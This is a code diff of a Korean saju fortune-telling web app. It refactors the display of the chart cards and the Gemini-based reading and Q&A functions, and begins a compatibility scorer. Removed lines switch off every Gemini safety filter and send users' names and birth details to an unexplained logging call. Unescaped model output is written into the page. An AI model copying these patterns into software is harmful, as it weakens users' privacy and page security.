-        <div class="pcell ${stemBg(data.day.stem)}" style="width:44px;height:50px;padding:5px;border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center">
-          <span class="hanja" style="font-size:22px">${sn}</span><span class="hangul">${STEM_KOR[data.day.stem]}</span>
+    <div style="display:flex;gap:10px;align-items:flex-start">
+      <div style="display:flex;gap:4px">
+        <div class="pcell ${stemBg(data.day.stem)}" style="width:40px;height:46px;padding:4px;border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+          <span class="hanja" style="font-size:20px">${sn}</span><span class="hangul">${STEM_KOR[data.day.stem]}</span>
         </div>
-        <div class="pcell ${brBg(data.day.branch)}" style="width:44px;height:50px;padding:5px;border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center">
-          <span class="hanja" style="font-size:22px">${bn}</span><span class="hangul">${BR_KOR[data.day.branch]}</span>
+        <div class="pcell ${brBg(data.day.branch)}" style="width:40px;height:46px;padding:4px;border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+          <span class="hanja" style="font-size:20px">${bn}</span><span class="hangul">${BR_KOR[data.day.branch]}</span>
         </div>
       </div>
       <div>
-        <div style="font-size:14px;font-weight:700;color:var(--gold2);margin-bottom:6px">${sn}${bn}(${STEM_KOR[data.day.stem]}${BR_KOR[data.day.branch]}) 일주</div>
+        <div style="font-size:14px;font-weight:700;color:var(--rose);margin-bottom:5px">${sn}${bn}(${STEM_KOR[data.day.stem]}${BR_KOR[data.day.branch]}) 일주</div>
         <p class="txt-sm">${desc}</p>
       </div>
     </div>`;
 }
 
-function renderDaeun(daeun, data) {
-  const age2026=CURRENT_YEAR-data.y;
-  document.getElementById('daeunInfo').textContent=
-    `${data.y}년생 · ${_gen==='male'?'남성':'여성'} · ${daeun.fwd?'순행(順行)':'역행(逆行)'} · 초대운 ${daeun.sa}세 시작`;
-
-  const row=document.getElementById('daeunRow');
-  row.innerHTML=daeun.pillars.map(p=>{
-    const isCur=age2026>=p.startAge&&age2026<=p.endAge;
-    return `<div class="daeun-card ${isCur?'current':''}">
+function renderDaeun(daeun,data){
+  const age=CURRENT_YEAR-data.y;
+  document.getElementById('daeunInfo').textContent=`${data.y}년생 · ${_gen==='male'?'남성':'여성'} · ${daeun.fwd?'순행':'역행'} · 초대운 ${daeun.sa}세`;
+  document.getElementById('daeunRow').innerHTML=daeun.pillars.map(p=>{
+    const cur=age>=p.startAge&&age<=p.endAge;
+    return `<div class="daeun-card ${cur?'current':''}">
       <div class="daeun-age">${p.startAge}–${p.endAge}세</div>
       <div class="daeun-pillar">
-        <div class="dp-cell ${stemBg(p.stem)}">
-          <span class="dp-hanja">${STEMS[p.stem]}</span>
-          <span class="dp-hangul">${STEM_KOR[p.stem]}</span>
-        </div>
-        <div class="dp-cell ${brBg(p.branch)}">
-          <span class="dp-hanja">${BRANCHES[p.branch]}</span>
-          <span class="dp-hangul">${BR_KOR[p.branch]}</span>
-        </div>
+        <div class="dp-cell ${stemBg(p.stem)}"><span class="dp-hanja">${STEMS[p.stem]}</span><span class="dp-hangul">${STEM_KOR[p.stem]}</span></div>
+        <div class="dp-cell ${brBg(p.branch)}"><span class="dp-hanja">${BRANCHES[p.branch]}</span><span class="dp-hangul">${BR_KOR[p.branch]}</span></div>
       </div>
-      <div style="font-size:9px;color:${isCur?'var(--gold)':'var(--text3)'}">${p.startYear}–${p.endYear}</div>
-      ${isCur?'<div style="font-size:9px;color:var(--gold);margin-top:3px;font-weight:700">현재 대운</div>':''}
+      <div style="font-size:9px;color:${cur?'var(--rose)':'var(--text3)'}">${p.startYear}–${p.endYear}</div>
+      ${cur?'<div style="font-size:9px;color:var(--rose);font-weight:700;margin-top:2px">현재 ✨</div>':''}
     </div>`;
   }).join('');
-
-  const curP=daeun.pillars.find(p=>age2026>=p.startAge&&age2026<=p.endAge);
+  const curP=daeun.pillars.find(p=>age>=p.startAge&&age<=p.endAge);
   if(curP){
-    const eEle=SI[curP.stem][0];
-    document.getElementById('daeunDesc').innerHTML=`
-      <div class="explain-row" style="padding-top:12px">
-        <div class="explain-body">
-          <div class="explain-title">현재 대운 — ${STEMS[curP.stem]}(${STEM_KOR[curP.stem]})${BRANCHES[curP.branch]}(${BR_KOR[curP.branch]}) (${curP.startAge}–${curP.endAge}세)</div>
-          <div class="explain-desc">
-            ${ELE.kor[eEle]} 기운의 대운입니다. ${ELE.traits[eEle]}의 성향이 10년간 강하게 영향을 미칩니다.
-            ${ELE.prose[eEle]}의 기운으로 ${curP.startYear}–${curP.endYear}년 사이에 이 분야에서 큰 변화와 성장의 기회가 찾아올 수 있습니다.
-          </div>
-        </div>
-      </div>`;
+    const e=SI[curP.stem][0];
+    document.getElementById('daeunDesc').innerHTML=`<div class="explain-row"><div><div class="explain-title">현재 대운 — ${STEMS[curP.stem]}${BRANCHES[curP.branch]} (${curP.startAge}–${curP.endAge}세)</div><div class="explain-desc">${ELE.kor[e]} 기운의 대운. ${ELE.traits[e]}의 성향이 강해지는 10년입니다.</div></div></div>`;
   }
 }
 
-function renderSeun(seun) {
+function renderSeun(seun){
   document.getElementById('seunGrid').innerHTML=seun.map(s=>`
     <div class="seun-card ${s.isCur?'cur':''}">
       <div class="seun-year">${s.year}년</div>
       <div class="daeun-pillar" style="justify-content:center">
-        <div class="dp-cell ${stemBg(s.stem)}" style="width:28px;height:32px;border-radius:6px">
-          <span class="dp-hanja" style="font-size:14px">${STEMS[s.stem]}</span>
-          <span class="dp-hangul">${STEM_KOR[s.stem]}</span>
-        </div>
-        <div class="dp-cell ${brBg(s.branch)}" style="width:28px;height:32px;border-radius:6px">
-          <span class="dp-hanja" style="font-size:14px">${BRANCHES[s.branch]}</span>
-          <span class="dp-hangul">${BR_KOR[s.branch]}</span>
-        </div>
+        <div class="dp-cell ${stemBg(s.stem)}" style="width:26px;height:30px;border-radius:6px"><span class="dp-hanja" style="font-size:13px">${STEMS[s.stem]}</span><span class="dp-hangul">${STEM_KOR[s.stem]}</span></div>
+        <div class="dp-cell ${brBg(s.branch)}" style="width:26px;height:30px;border-radius:6px"><span class="dp-hanja" style="font-size:13px">${BRANCHES[s.branch]}</span><span class="dp-hangul">${BR_KOR[s.branch]}</span></div>
       </div>
-      ${s.isCur?`<div style="font-size:9px;color:var(--gold);margin-top:3px;font-weight:700">올해</div>`:''}
+      ${s.isCur?`<div style="font-size:9px;color:var(--rose);font-weight:700;margin-top:2px">올해 ✨</div>`:''}
     </div>`).join('');
-
   const cur=seun.find(s=>s.isCur);
-  if(cur){
-    document.getElementById('seunDesc').innerHTML=`
-      <div class="explain-row" style="padding-top:10px">
-        <div class="explain-body">
-          <div class="explain-title">${cur.year}년 세운 — ${STEMS[cur.stem]}(${STEM_KOR[cur.stem]})${BRANCHES[cur.branch]}(${BR_KOR[cur.branch]})년</div>
-          <div class="explain-desc">
-            올해는 ${ELE.kor[SI[cur.stem][0]]} 기운의 해입니다. ${ELE.traits[SI[cur.stem][0]]}에 집중하는 한 해가 됩니다.
-            ${ELE.name[BI[cur.branch][0]]}의 지지 에너지가 더해져 ${ELE.kor[BI[cur.branch][0]]} 방면의 활동이 활발해집니다.
-          </div>
-        </div>
-      </div>`;
-  }
+  if(cur) document.getElementById('seunDesc').innerHTML=`<div class="explain-row"><div><div class="explain-title">${cur.year}년 — ${STEMS[cur.stem]}${BRANCHES[cur.branch]}년</div><div class="explain-desc">올해는 ${ELE.kor[SI[cur.stem][0]]} 기운의 해. ${ELE.traits[SI[cur.stem][0]]}에 집중하는 한 해가 됩니다.</div></div></div>`;
 }
 
-function renderWolun(wolun) {
-  const monthNames=["1월","2월","3월","4월","5월","6월","7월","8월","9월","10월","11월","12월"];
+function renderWolun(wolun){
+  const mn=["1월","2월","3월","4월","5월","6월","7월","8월","9월","10월","11월","12월"];
   const now=new Date().getMonth()+1;
   document.getElementById('wolunGrid').innerHTML=wolun.map(w=>`
-    <div class="wolun-card" style="${w.month===now?'border-color:var(--gold);background:var(--goldf)':''}">
-      <div class="month-label">${monthNames[w.month-1]}${w.month===now?' ◀':''}</div>
+    <div class="wolun-card" style="${w.month===now?'border-color:var(--rose);background:var(--peach3)':''}">
+      <div class="month-label">${mn[w.month-1]}${w.month===now?' ◀':''}</div>
       <div style="display:flex;gap:3px;justify-content:center">
-        <div class="dp-cell ${stemBg(w.stem)}" style="width:26px;height:29px;border-radius:6px">
-          <span class="dp-hanja" style="font-size:13px">${STEMS[w.stem]}</span>
-          <span class="dp-hangul" style="font-size:7px">${STEM_KOR[w.stem]}</span>
-        </div>
-        <div class="dp-cell ${brBg(w.branch)}" style="width:26px;height:29px;border-radius:6px">
-          <span class="dp-hanja" style="font-size:13px">${BRANCHES[w.branch]}</span>
-          <span class="dp-hangul" style="font-size:7px">${BR_KOR[w.branch]}</span>
-        </div>
+        <div class="dp-cell ${stemBg(w.stem)}" style="width:24px;height:27px;border-radius:5px"><span class="dp-hanja" style="font-size:12px">${STEMS[w.stem]}</span><span class="dp-hangul" style="font-size:7px">${STEM_KOR[w.stem]}</span></div>
+        <div class="dp-cell ${brBg(w.branch)}" style="width:24px;height:27px;border-radius:5px"><span class="dp-hanja" style="font-size:12px">${BRANCHES[w.branch]}</span><span class="dp-hangul" style="font-size:7px">${BR_KOR[w.branch]}</span></div>
       </div>
     </div>`).join('');
 }
 
 // =====================================================
-// AI 스트리밍 분석
+// AI 분석
 // =====================================================
-async function streamAI(data, gender, sal, daeun, seun) {
+async function streamAI(data,gender,sal,daeun,seun){
   const con=document.getElementById('aiContainer');
   const ld=document.getElementById('aiLoading');
-  con.innerHTML=''; ld.style.display='block';
-
+  con.innerHTML='';ld.style.display='block';
   const myEle=SI[data.dSt][0];
   const maxI=data.cnt.indexOf(Math.max(...data.cnt));
   const minI=data.cnt.indexOf(Math.min(...data.cnt));
-  const age2026=CURRENT_YEAR-data.y;
-  const curDaeun=daeun.pillars.find(p=>age2026>=p.startAge&&age2026<=p.endAge)||daeun.pillars[0];
-  const curSeun=seun.find(s=>s.isCur);
+  const age=CURRENT_YEAR-data.y;
+  const curD=daeun.pillars.find(p=>age>=p.startAge&&age<=p.endAge)||daeun.pillars[0];
+  const curS=seun.find(s=>s.isCur);
   const salNames=sal.map(s=>s.name).join(', ')||'없음';
   const gilNames=sal.filter(s=>(SAL_INFO[s.name]||{}).type==='gil').map(s=>s.name).join(', ')||'없음';
 
-  const prompt=`당신은 40년 경력의 명리학 대가입니다. 다음 사주 정보를 바탕으로 5가지 카테고리를 한국어로 깊이 있게 풀이하세요. 말투는 따뜻하고 통찰력 있게, 구체적으로 작성하세요.
+  const prompt=`당신은 40년 경력의 명리학 대가입니다. 아래 사주를 바탕으로 5가지 카드를 한국어로 따뜻하고 통찰력 있게 작성하세요.
 
-[사주 원국]
-- 일주(본인): ${STEMS[data.day.stem]}(${STEM_KOR[data.day.stem]})${BRANCHES[data.day.branch]}(${BR_KOR[data.day.branch]})
-- 년주: ${STEMS[data.year.stem]}${BRANCHES[data.year.branch]} / 월주: ${STEMS[data.month.stem]}${BRANCHES[data.month.branch]} / 시주: ${STEMS[data.time.stem]}${BRANCHES[data.time.branch]}${!data.hasTime?' (시간 미입력, 참고용)':''}
-- 일간 오행: ${ELE.kor[myEle]} (${SI[data.dSt][1]?'양':'음'})
-- 오행 분포: 목${data.cnt[0]} 화${data.cnt[1]} 토${data.cnt[2]} 금${data.cnt[3]} 수${data.cnt[4]}
-- 가장 강한 오행: ${ELE.name[maxI]}, 부족한 오행: ${ELE.name[minI]}
+[사주]
+일주: ${STEMS[data.day.stem]}(${STEM_KOR[data.day.stem]})${BRANCHES[data.day.branch]}(${BR_KOR[data.day.branch]})
+년주: ${STEMS[data.year.stem]}${BRANCHES[data.year.branch]} / 월주: ${STEMS[data.month.stem]}${BRANCHES[data.month.branch]} / 시주: ${STEMS[data.time.stem]}${BRANCHES[data.time.branch]}${!data.hasTime?' (시간 미입력)':''}
+일간 오행: ${ELE.kor[myEle]} / 오행: 목${data.cnt[0]}화${data.cnt[1]}토${data.cnt[2]}금${data.cnt[3]}수${data.cnt[4]}
+강한 오행: ${ELE.name[maxI]} / 부족: ${ELE.name[minI]}
+길성: ${gilNames} / 신살: ${salNames}
+현재 대운: ${STEMS[curD.stem]}${BRANCHES[curD.branch]} (${curD.startAge}–${curD.endAge}세)
+2026 세운: ${curS?STEMS[curS.stem]+BRANCHES[curS.branch]:'丙午'}년
+성별: ${gender==='male'?'남성':'여성'} / 만 ${age}세
 
-[신살·길성]
-- 길성: ${gilNames}
-- 신살 전체: ${salNames}
-
-[대운·세운]
-- 현재 대운: ${STEMS[curDaeun.stem]}${BRANCHES[curDaeun.branch]} (${curDaeun.startAge}–${curDaeun.endAge}세, ${curDaeun.startYear}–${curDaeun.endYear}년)
-- 2026년 세운: ${curSeun?STEMS[curSeun.stem]+BRANCHES[curSeun.branch]:'丙午'}년
-
-[기준 정보]
-- 성별: ${gender==='male'?'남성(건명)':'여성(곤명)'}
-- 현재 나이(만): ${age2026}세
-- 기준연도: 2026년 병오년
-
-반드시 아래 JSON 배열만 반환하세요 (마크다운 코드블록 없이, 순수 JSON만):
+순수 JSON 배열만 반환 (마크다운 없이):
 [
   {"title":"🔮 사주 총평 & 타고난 기질","body":"내용"},
   {"title":"💰 재물운 & 직업 적성","body":"내용"},
   {"title":"❤️ 인연운 & 대인관계","body":"내용"},
-  {"title":"🌀 현재 대운·세운 영향 분석","body":"내용"},
-  {"title":"⭐ 신살 영향 & 활용법","body":"내용"}
+  {"title":"🌀 대운·세운 영향","body":"내용"},
+  {"title":"⭐ 신살 & 활용법","body":"내용"}
 ]
-규칙: 각 body는 핵심만 담아 자연스럽게 완결된 문장으로 마무리할 것. 강조 단어는 **단어** 형식. JSON 외 텍스트 절대 금지.`;
+각 body는 자연스럽게 완결된 문장으로. 강조는 **단어** 형식.`;
 
-  // 안전 필터 비활성화
-  const AI_SAFETY_OFF = [
-    {category:'HARM_CATEGORY_HARASSMENT',       threshold:'BLOCK_NONE'},
-    {category:'HARM_CATEGORY_HATE_SPEECH',      threshold:'BLOCK_NONE'},
-    {category:'HARM_CATEGORY_SEXUALLY_EXPLICIT',threshold:'BLOCK_NONE'},
-    {category:'HARM_CATEGORY_DANGEROUS_CONTENT',threshold:'BLOCK_NONE'},
-  ];
-  // 모델 우선순위: 3-flash-preview(무료티어) → 2.5-flash → 2.5-flash-lite
-  const AI_MODELS = [
-    'gemini-3-flash-preview',
-    'gemini-2.5-flash',
-    'gemini-2.5-flash-lite',
-  ];
-
-  const _aiCall = async (model, bodyObj) => {
-    const ep = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${_$gk()}`;
-    const res = await fetch(ep, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify(bodyObj)
-    });
-    const json = await res.json();
-    if(json.error) throw new Error(`[${json.error.code||res.status}] ${json.error.message}`);
-    const cand = (json.candidates||[])[0];
-    if(cand?.finishReason==='SAFETY') throw new Error('SAFETY_BLOCK');
-    // thinking 모델은 parts에 thought + text가 섞임 → text 타입만 추출
-    return ((cand?.content?.parts)||[])
-      .filter(p => p.text && !p.thought)
-      .map(p=>p.text)
-      .join('').trim();
-  };
-
-  let rawTxt = '';
-  for(const model of AI_MODELS){
-    try{
-      rawTxt = await _aiCall(model, {
-        contents:[{role:"user",parts:[{text:prompt}]}],
-        safetySettings: AI_SAFETY_OFF,
-        generationConfig:{
-          maxOutputTokens: 3000,   // 넉넉하게 — 프롬프트가 길이 조절, 토큰이 자르지 않게
-          temperature: 0.85,
-          thinkingConfig: {thinkingBudget: 0}
-        }
-      });
-      if(rawTxt){ console.log(`[AI분석] ${model} 성공`); break; }
-    } catch(e){
-      console.warn(`[AI분석] ${model} 실패:`, e.message);
-      await new Promise(r=>setTimeout(r,400));
-    }
-  }
-
-  let cards;
-  try{
-    const match=rawTxt.match(/\[[\s\S]*\]/);
-    cards=JSON.parse(match?match[0]:rawTxt);
-  } catch{
-    cards=null;
-  }
-
+  const raw=await callGemini(prompt,3000);
   ld.style.display='none';
-  if(!Array.isArray(cards)||!cards.length){
-    cards=fallbackCards(data,gender,myEle,maxI,minI,sal,curDaeun,curSeun);
+  let cards=null;
+  if(raw){
+    try{
+      const m=raw.match(/\[[\s\S]*\]/);
+      cards=JSON.parse(m?m[0]:raw);
+    }catch{}
   }
-  cards.forEach((c,i)=>{
-    setTimeout(()=>{
-      const el=document.createElement('div');
-      el.className='ai-card'; el.style.animationDelay=i*.1+'s';
-      el.innerHTML=`<div class="ai-card-title">${c.title||''}</div><p>${(c.body||'').replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')}</p>`;
-      con.appendChild(el);
-      if(i===cards.length-1) el.scrollIntoView({behavior:'smooth',block:'nearest'});
-    },i*700);
-  });
+  if(!Array.isArray(cards)||!cards.length){
+    cards=fallbackCards(data,gender,myEle,maxI,minI,sal,curD,curS);
+  }
+  cards.forEach((c,i)=>setTimeout(()=>{
+    const el=document.createElement('div');
+    el.className='ai-card';el.style.animationDelay=i*.1+'s';
+    el.innerHTML=`<div class="ai-card-title">${c.title||''}</div><p>${(c.body||'').replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')}</p>`;
+    con.appendChild(el);
+    if(i===cards.length-1) el.scrollIntoView({behavior:'smooth',block:'nearest'});
+  },i*650));
 }
 
 function fallbackCards(data,gender,myEle,maxI,minI,sal,curD,curS){
   const gils=sal.filter(s=>(SAL_INFO[s.name]||{}).type==='gil');
   const sals=sal.filter(s=>(SAL_INFO[s.name]||{}).type==='sal');
   return[
-    {title:"🔮 사주 총평 & 타고난 기질",body:`당신은 **${ELE.kor[myEle]}** 기운의 일간을 타고났습니다. 사주 내 **${ELE.name[maxI]}** 기운이 강하여 ${ELE.traits[maxI]}의 성향이 두드러지며, **${ELE.name[minI]}** 기운이 부족하므로 이를 보충하는 것이 균형의 핵심입니다.`},
-    {title:"💰 재물운 & 직업 적성",body:`${ELE.kor[myEle]}의 특성인 **${ELE.traits[myEle]}**을 살리는 직업 환경에서 성과가 뛰어납니다. 오행 분포(${data.cnt.join(':')})를 보면 안정적 소득보다 **변화와 도전** 속에서 더 큰 재물이 열립니다.`},
-    {title:'❤️ 인연운 & 대인관계',body:`${gender==='male'?'재성(財星)':'관성(官星)'}의 동태를 보면 본인의 강한 기운을 **보완해줄 인연**이 필요합니다. 경청과 공감 능력을 키우는 것이 관계 발전의 열쇠입니다.`},
-    {title:"🌀 현재 대운·세운 영향",body:`현재 **${STEMS[curD.stem]}(${STEM_KOR[curD.stem]})${BRANCHES[curD.branch]}(${BR_KOR[curD.branch]}) 대운** 중입니다. ${ELE.kor[SI[curD.stem][0]]} 기운이 강해지는 시기로, ${ELE.traits[SI[curD.stem][0]]}에 집중하면 좋은 결과가 있습니다.`},
-    {title:"⭐ 신살 영향 & 활용법",body:`${gils.length?`**${gils.map(s=>s.name).join('·')}** 길성의 기운으로 귀인 복이 있으며 어려울 때 도움이 찾아옵니다. `:''}${sals.length?`**${sals.map(s=>s.name).join('·')}** 신살에 주의하되, 이를 에너지로 전환하면 오히려 성공의 동력이 됩니다.`:''}`},
+    {title:"🔮 사주 총평",body:`**${ELE.kor[myEle]}** 일간을 타고났습니다. **${ELE.name[maxI]}** 기운이 강하고 **${ELE.name[minI]}** 기운을 보충하면 더욱 균형 잡힌 삶을 살 수 있습니다.`},
+    {title:"💰 재물·직업운",body:`${ELE.traits[myEle]}의 특성을 살리는 환경에서 빛납니다. 안정보다 **변화 속에서 더 큰 기회**가 열립니다.`},
+    {title:"❤️ 인연운",body:`${gender==='male'?'재성(財星)':'관성(官星)'}의 흐름을 보면 **나를 보완해줄 인연**이 필요합니다. 경청과 공감이 관계의 열쇠입니다.`},
+    {title:"🌀 대운·세운",body:`현재 **${STEMS[curD.stem]}${BRANCHES[curD.branch]} 대운** 중. ${ELE.kor[SI[curD.stem][0]]} 기운이 강해지는 시기입니다.`},
+    {title:"⭐ 신살",body:`${gils.length?`**${gils.map(s=>s.name).join('·')}** 길성으로 귀인 복이 있습니다. `:''}${sals.length?`**${sals.map(s=>s.name).join('·')}** 신살을 에너지로 전환하면 큰 힘이 됩니다.`:''}`},
   ];
 }
 
 // =====================================================
-// ★ 핵심 수정: Q&A — 텍스트 절대 잘리지 않는 버전
+// Q&A
 // =====================================================
 async function askQ(){
   if(!_data) return;
   const q=document.getElementById('qaInput').value.trim();
-  if(!q){alert('질문을 입력하세요.');return;}
-
+  if(!q){alert('질문을 입력해주세요 🌸');return;}
   const btn=document.getElementById('askBtn');
-  btn.disabled=true;
-  btn.innerHTML='<i class="fas fa-spinner fa-spin" style="margin-right:6px"></i>답변 생성 중...';
-
+  btn.disabled=true;btn.innerHTML='✨ 답변 생성 중...';
   const box=document.getElementById('qnaBox');
-
-  // 질문 버블
-  const qb=document.createElement('div');
-  qb.className='q-bubble';
+  const qb=document.createElement('div');qb.className='q-bubble';
   qb.innerHTML=`<span class="q-label">나의 질문</span>${escHtml(q)}`;
   box.appendChild(qb);
-
-  // 답변 버블 — 로딩 점 표시
-  const ab=document.createElement('div');
-  ab.className='a-bubble';
+  const ab=document.createElement('div');ab.className='a-bubble';
   ab.innerHTML=`<span class="a-label">✦ AI 명리 에이전트</span><div class="typing-dots"><span></span><span></span><span></span></div>`;
   box.appendChild(ab);
   ab.scrollIntoView({behavior:'smooth',block:'end'});
 
-  _ev({
-    name:_name,
-    birthDate:document.getElementById('birthDate').value,
-    birthTime:document.getElementById('birthTime').value,
-    gender:_gen,
-    dayPillar:STEMS[_data.day.stem]+BRANCHES[_data.day.branch],
-    question:q
-  });
+  const age=CURRENT_YEAR-_data.y;
+  const curD=_daeun.pillars.find(p=>age>=p.startAge&&age<=p.endAge)||_daeun.pillars[0];
 
-  const age2026=CURRENT_YEAR-_data.y;
-  const curD=_daeun.pillars.find(p=>age2026>=p.startAge&&age2026<=p.endAge)||_daeun.pillars[0];
-  const salNames=_sal.map(s=>s.name).join(', ')||'없음';
+  const ctx=`당신은 40년 경력의 명리학 대가입니다.
 
-  const ctx=`당신은 40년 경력의 명리학 대가입니다. 아래 사주 정보를 바탕으로 질문에 성심껏 답변하세요.
-
-[사주 정보]
-- 일주: ${STEMS[_data.day.stem]}(${STEM_KOR[_data.day.stem]})${BRANCHES[_data.day.branch]}(${BR_KOR[_data.day.branch]})
-- 오행: 목${_data.cnt[0]} 화${_data.cnt[1]} 토${_data.cnt[2]} 금${_data.cnt[3]} 수${_data.cnt[4]}
-- 현재 대운: ${STEMS[curD.stem]}${BRANCHES[curD.branch]} (${curD.startAge}~${curD.endAge}세)
-- 신살: ${salNames}
-- 성별: ${_gen==='male'?'남성':'여성'} / 만 ${age2026}세 / 2026 병오년 기준
+[사주]
+일주: ${STEMS[_data.day.stem]}(${STEM_KOR[_data.day.stem]})${BRANCHES[_data.day.branch]}(${BR_KOR[_data.day.branch]})
+오행: 목${_data.cnt[0]}화${_data.cnt[1]}토${_data.cnt[2]}금${_data.cnt[3]}수${_data.cnt[4]}
+대운: ${STEMS[curD.stem]}${BRANCHES[curD.branch]} (${curD.startAge}~${curD.endAge}세)
+신살: ${_sal.map(s=>s.name).join(', ')||'없음'}
+성별: ${_gen==='male'?'남성':'여성'} / 만 ${age}세 / 2026 병오년
 
 [질문]
 ${q}
 
-답변 규칙:
-- 인사말 없이 바로 본론 시작
-- 명리학 근거를 들어 구체적으로 설명
-- 핵심을 담아 자연스럽게 완결된 문장으로 마무리 (중간에 끊기지 않을 것)
-- 마지막 문장은 실용적인 조언이나 격려로 끝낼 것`;
+답변 규칙: 인사말 없이 바로 본론, 명리학 근거 포함, 자연스럽게 완결된 문장으로 마무리, 마지막은 실용적 조언이나 격려.`;
 
-  // 모델 우선순위: 3-flash-preview → 2.5-flash → 2.5-flash-lite
-  const QA_MODELS = [
-    'gemini-3-flash-preview',
-    'gemini-2.5-flash',
-    'gemini-2.5-flash-lite',
-  ];
-  const QA_SAFETY_OFF = [
-    {category:'HARM_CATEGORY_HARASSMENT',       threshold:'BLOCK_NONE'},
-    {category:'HARM_CATEGORY_HATE_SPEECH',      threshold:'BLOCK_NONE'},
-    {category:'HARM_CATEGORY_SEXUALLY_EXPLICIT',threshold:'BLOCK_NONE'},
-    {category:'HARM_CATEGORY_DANGEROUS_CONTENT',threshold:'BLOCK_NONE'},
-  ];
-
-  const _qaCall = async (model) => {
-    const ep = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${_$gk()}`;
-    const res = await fetch(ep, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        contents:[{role:"user", parts:[{text:ctx}]}],
-        safetySettings: QA_SAFETY_OFF,
-        generationConfig:{
-          maxOutputTokens: 2048,   // 넉넉하게 — 프롬프트가 길이 조절
-          temperature: 0.85,
-          thinkingConfig: {thinkingBudget: 0}  // thinking 비활성화
-        }
-      })
-    });
-    const json = await res.json();
-    if(json.error) throw new Error(`[${json.error.code||res.status}] ${json.error.message}`);
-    const cand = (json.candidates||[])[0];
-    if(!cand) throw new Error('no candidates');
-    if(cand.finishReason==='SAFETY'){
-      const bl=(cand.safetyRatings||[]).filter(r=>r.blocked).map(r=>r.category).join(',');
-      throw new Error(`SAFETY_BLOCK: ${bl||'unknown'}`);
-    }
-    // thinking 모델 thought 파트 제외하고 text만 추출
-    const txt = (cand.content?.parts||[])
-      .filter(p => p.text && !p.thought)
-      .map(p=>p.text)
-      .join('').trim();
-    if(!txt) throw new Error(`empty (${cand.finishReason||'?'})`);
-    return txt;
-  };
-
-  let answerText = '';
-  let lastErr = '';
-  for(const model of QA_MODELS){
-    try{
-      answerText = await _qaCall(model);
-      if(answerText){ console.log(`[QA] ${model} 성공`); break; }
-    } catch(e){
-      lastErr = e.message;
-      console.warn(`[QA] ${model} 실패:`, e.message);
-      await new Promise(r=>setTimeout(r, 400));
-    }
-  }
-
-  if(!answerText){
-    answerText = `답변 생성에 실패했습니다.\n사유: ${lastErr||'알 수 없는 오류'}\n\n잠시 후 다시 시도해주세요.`;
-  }
-
-  // ★ 핵심: 답변 버블 내용을 완전한 텍스트로 교체 (잘림 없음)
-  const contentDiv = document.createElement('div');
-  contentDiv.style.cssText = 'white-space:pre-wrap;overflow-wrap:break-word;word-break:keep-all;';
-  contentDiv.textContent = answerText;
-
-  ab.innerHTML = '';
-  const label = document.createElement('span');
-  label.className = 'a-label';
-  label.textContent = '✦ AI 명리 에이전트';
-  ab.appendChild(label);
-  ab.appendChild(contentDiv);
-
-  btn.disabled=false;
-  btn.innerHTML='<i class="fas fa-paper-plane" style="margin-right:6px"></i>사주로 답변받기';
+  const answer=await callGemini(ctx,2048);
+  const txt=answer||'일시적 오류입니다. 잠시 후 다시 시도해주세요. 🌸';
+  const cd=document.createElement('div');
+  cd.style.cssText='white-space:pre-wrap;overflow-wrap:break-word;word-break:keep-all;';
+  cd.textContent=txt;
+  ab.innerHTML='';
+  const lbl=document.createElement('span');lbl.className='a-label';lbl.textContent='✦ AI 명리 에이전트';
+  ab.appendChild(lbl);ab.appendChild(cd);
+  btn.disabled=false;btn.innerHTML='✨ 사주로 답변받기';
   document.getElementById('qaInput').value='';
-
-  // 칩 선택 초기화
   document.querySelectorAll('#qaChips .chip').forEach(c=>c.classList.remove('on'));
-
   setTimeout(()=>ab.scrollIntoView({behavior:'smooth',block:'end'}),100);
 }
 
-// HTML 이스케이프 유틸
-function escHtml(s){
-  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+// =====================================================
+// 궁합 분석
+// =====================================================
+// 오행 상생/상극 관계
+const ELE_REL=[
+  // 목화토금수 기준 상생 여부 [0=극, 1=생, 2=비화(같음), 3=피생, 4=피극]
+  // 목→화생, 목→토극, 목→금피극, 목→수피생, 목→목비화
+  [2,1,0,3,4],  // 목
+  [4,2,1,0,3],  // 화
+  [3,4,2,1,0],  // 토
+  [0,3,4,2,1],  // 금
+  [1,0,3,4,2],  // 수
+];
+
+function calcCompatScore(d1,d2){
+  // 일간 상성
+  const e1=SI[d1.dSt][0],e2=SI[d2.dSt][0];
+  const rel=ELE_REL[e1][e2];
+  let base;
+  if(rel===2) base=70;        // 비화: 비슷한 기운
+  else if(rel===1||rel===3) base=85; // 상생
+  else base=55;               // 상극
+  // 오행 보완도
+  const cnt1=d1.cnt,cnt2=d2.cnt;
+  let complement=0;
+  for(let i=0;i<5;i++){
+    if(cnt1[i]===0&&cnt2[i]>0) complement+=4;
+    if(cnt2[i]===0&&cnt1[i]>0) complement+=4;
+  }
+  complement=Math.min(complement,15);
+  // 일지 관계
+  const b1=d1.day.branch,b2=d2.day.branch;
+  let brBonus=0;
+  const hexComb=[[2,6],[2,10],[6,10],[8,0],[8,4],[0,4],[5,11],[1,7],[3,9]];
+  if(hexComb.some(([a,b])=>(b1===a&&b2===b)||(b1===b&&b2===a))) brBonus=8;
+  const score=Math.min(100,Math.round(base+complement+brBonus));
+  return{score,e1,e2,rel};
+}
+
+async function analyzeCompat(){
+  const n1=document.getElementById('c1Name').value.trim()||'첫 번째';
+  const d1=document.getElementById('c1Date').value;
+  const t1=document.getElementById('c1Time').value;
+  const g1=document.querySelector('input[name="cg1"]:checked').value;
+  const n2=document.getElementById('c2Name').value.trim()||'두 번째';
+  const d2=document.getElementById('c2Date').value;
+  const t2=document.getElementById('c2Time').value;
+  const g2=document.querySelector('input[name="cg2"]:checked').value;
+
+  if(!d1||!d2){alert('두 사람의 생년월일을 모두 입력해주세요 🌸');return;}
+
+  document.getElementById('compatSection').style.display='none';
+  document.getElementById('loadingView').style.display='flex';
+  document.getElementById('loadingTxt').textContent='궁합을 계산하는 중... 💑';
+
